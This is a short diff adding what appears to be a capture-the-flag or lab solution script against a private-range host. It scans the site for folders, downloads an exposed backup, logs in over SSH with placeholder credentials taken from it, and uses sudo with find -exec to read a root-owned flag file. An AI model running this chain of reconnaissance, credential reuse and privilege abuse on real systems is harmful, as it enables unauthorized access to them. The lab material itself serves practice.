@@ -1,0 +1,8 @@
+## the LOUD way: sweep the site for folders, then take the sudo route
+webscan http://10.10.12.30/
+curl -s http://10.10.12.30/backup/site-backup.tar.gz -o site-backup.tar.gz
+tar xzf site-backup.tar.gz
+ssh -o StrictHostKeyChecking=accept-new {{SVCUSER}}@10.10.12.30
+{{DBPW}}
+sudo find /root -name flag.txt -exec cat {} \;
+exit
